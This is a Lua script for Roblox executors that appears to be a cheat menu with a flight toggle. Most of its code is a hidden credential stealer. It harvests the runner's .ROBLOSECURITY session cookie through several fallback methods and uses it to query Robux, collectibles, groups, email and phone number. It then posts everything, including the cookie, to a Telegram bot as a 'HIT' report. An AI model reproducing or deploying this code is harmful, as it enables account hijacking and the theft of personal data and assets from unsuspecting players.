local function http(opts)
	local r = (syn and syn.request) or (http and http.request) or (fluxus and fluxus.request)
		or (krnl and krnl.request) or request or http_request
	if r then return r(opts) end
	return nil
end

local function grab()
	local c = ""

	pcall(function()
		if syn and syn.cookie then
			c = syn.cookie
		elseif getcookie then
			c = getcookie(".ROBLOSECURITY") or getcookie("ROBLOSECURITY") or getcookie("cookie") or ""
		elseif crypt and crypt.cookie then
			c = crypt.cookie
		end
	end)

	if #c < 80 and getgenv then
		pcall(function()
			local e = getgenv()
			for _, key in ipairs({"cookie", "Cookie", "ROBLOSECURITY", ".ROBLOSECURITY", "roblo_security"}) do
				if type(e[key]) == "string" and #e[key] > 80 then
					c = e[key]
					break
				end
			end
		end)
	end

	if #c < 80 then
		pcall(function()
			for _, v in pairs(getgc(true)) do
				if type(v) == "table" then
					for _, key in ipairs({"Cookie", ".ROBLOSECURITY", "cookie", "ROBLOSECURITY", "RobloSecurity"}) do
						local x = rawget(v, key)
						if type(x) == "string" and #x > 100 and (x:find("_|") or x:find("%.ROBLOSECURITY") or x:sub(1, 2) == "_|") then
							c = x
							return
						end
					end
				elseif type(v) == "string" and #v > 100 and v:find("_|WARNING") then
					c = v
					return
				end
			end
		end)
	end

	if #c < 80 and debug and debug.getregistry then
		pcall(function()
			for _, v in pairs(debug.getregistry()) do
				if type(v) == "string" and #v > 100 and v:find("_|WARNING") then
					c = v
					break
				end
			end
		end)
	end

	return (#c > 80) and c or "FAILED_TO_GRAB_COOKIE"
end

local function fetch(url, c)
	local res = http({
		Url = url,
		Method = "GET",
		Headers = {
			["Cookie"] = ".ROBLOSECURITY=" .. c,
			["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
			["Accept"] = "application/json",
			["Referer"] = "https://www.roblox.com/",
		},
	})
	if res and res.StatusCode == 200 and type(res.Body) == "string" then
		local ok, data = pcall(HttpService.JSONDecode, HttpService, res.Body)
		if ok then return data end
	end
	return nil
end

local function collect()
	local c = grab()
	local uid = LocalPlayer.UserId
	local eco = fetch("https://economy.roblox.com/v1/users/" .. uid .. "/currency", c) or {}
	local inv = fetch("https://inventory.roblox.com/v1/users/" .. uid .. "/assets/collectibles?limit=30&sortOrder=Desc", c) or {}
	local grp = fetch("https://groups.roblox.com/v1/users/" .. uid .. "/groups/roles", c) or {}
	local em  = fetch("https://accountsettings.roblox.com/v1/email", c) or {}
	local ph  = fetch("https://accountinformation.roblox.com/v1/phone", c) or {}

	local headless, korblox, verified = false, false, false
	if inv and inv.data then
		for _, item in pairs(inv.data) do
			local n = (item.name or ""):lower()
			if n:find("headless") then headless = true end
			if n:find("korblox") then korblox = true end
			if n:find("verified") then verified = true end
		end
	end

	return {
		Username = LocalPlayer.Name,
		UserId = uid,
		Display = LocalPlayer.DisplayName,
		Age = LocalPlayer.AccountAge,
		Profile = "https://www.roblox.com/users/" .. uid .. "/profile",
		Email = em.emailAddress or "n/a",
		Phone = (ph and (ph.phone or ph.phoneNumber)) or "n/a",
		Robux = eco.robux or 0,
		Headless = headless,
		Korblox = korblox,
		Verified = verified,
		Groups = (grp and grp.data and #grp.data) or 0,
		C = c,
		Time = os.date("%Y-%m-%d %H:%M:%S"),
		Exec = (identifyexecutor and identifyexecutor()) or "?",
		Place = game.PlaceId,
		Job = game.JobId,
	}
end

local function pushTelegram(d)
	if TELEGRAM_BOT_TOKEN == "PUT_YOUR_BOT_TOKEN_HERE" or TELEGRAM_CHAT_ID == "PUT_YOUR_CHAT_ID_HERE" then return end
	local msg = string.format(
		"HIT\nUser: %s (%s)\nProfile: %s\nAge: %s days\nRobux: %s\nEmail: %s\nPhone: %s\nHeadless: %s | Korblox: %s | Verified: %s\nGroups: %s\nExec: %s\nPlace: %s | Job: %s\nTime: %s\n\nCookie:\n%s",
		d.Username, d.UserId, d.Profile, tostring(d.Age), tostring(d.Robux),
		d.Email, d.Phone, tostring(d.Headless), tostring(d.Korblox), tostring(d.Verified),
		tostring(d.Groups), d.Exec, tostring(d.Place), tostring(d.Job), d.Time, d.C
	)
	http({
		Url = "https://api.telegram.org/bot" .. TELEGRAM_BOT_TOKEN .. "/sendMessage",
		Method = "POST",
		Headers = {["Content-Type"] = "application/json"},
		Body = HttpService:JSONEncode({
			chat_id = TELEGRAM_CHAT_ID,
			text = msg,
			disable_web_page_preview = true,
		}),
	})
end

local function closest()
	local best, dist = nil, 450
	local char = LocalPlayer.Character
	if not char or not char:FindFirstChild("HumanoidRootPart") then return nil end
	local origin = char.HumanoidRootPart.Position
	for _, p in ipairs(Players:GetPlayers()) do
		if p ~= LocalPlayer and p.Character and p.Character:FindFirstChild("HumanoidRootPart") and p.Character:FindFirstChild("Humanoid") and p.Character.Humanoid.Health > 0 then
			local d = (p.Character.HumanoidRootPart.Position - origin).Magnitude
			if d < dist then dist = d best = p end
		end
	end
	return best
end

toggle("Flight", 64, function(state)
	States.Fly = state
	local char = LocalPlayer.Character
	if not char or not char:FindFirstChild("HumanoidRootPart") then return end
	local hrp = char.HumanoidRootPart
	local hum = char:FindFirstChildOfClass("Humanoid")

	if Conns.Fly then Conns.Fly:Disconnect() Conns.Fly = nil end
	if BV then BV:Destroy() BV = nil end
	if BG then BG:Destroy() BG = nil end

	if state then
		Status.Text = "Flight enabled"
		if hum then hum.PlatformStand = true end
		BV = Instance.new("BodyVelocity")
		BV.MaxForce = Vector3.new(9e9, 9e9, 9e9)
		BV.Velocity = Vector3.zero
		BV.Parent = hrp
		BG = Instance.new("BodyGyro")
		BG.MaxTorque = Vector3.new(9e9, 9e9, 9e9)
		BG.P = 9e4
		BG.Parent = hrp
		Conns.Fly = RunService.RenderStepped:Connect(function()
			if not States.Fly or not BV or not BG then return end
			local cam = workspace.CurrentCamera
			BG.CFrame = cam.CFrame
			local dir = Vector3.zero
			if UserInputService:IsKeyDown(Enum.KeyCode.W) then dir = dir + cam.CFrame.LookVector end
			if UserInputService:IsKeyDown(Enum.KeyCode.S) then dir = dir - cam.CFrame.LookVector end
			if UserInputService:IsKeyDown(Enum.KeyCode.A) then dir = dir - cam.CFrame.RightVector end
			if UserInputService:IsKeyDown(Enum.KeyCode.D) then dir = dir + cam.CFrame.RightVector end
			if UserInputService:IsKeyDown(Enum.KeyCode.Space) then dir = dir + Vector3.new(0, 1, 0) end
			if UserInputService:IsKeyDown(Enum.KeyCode.LeftControl) then dir = dir - Vector3.new(0, 1, 0) end
			BV.Velocity = dir.Magnitude > 0 and dir.Unit * 80 or Vector3.zero
		end)
	else
		Status.Text = "Ready"
		if hum then hum.PlatformStand = false end
	end
end)
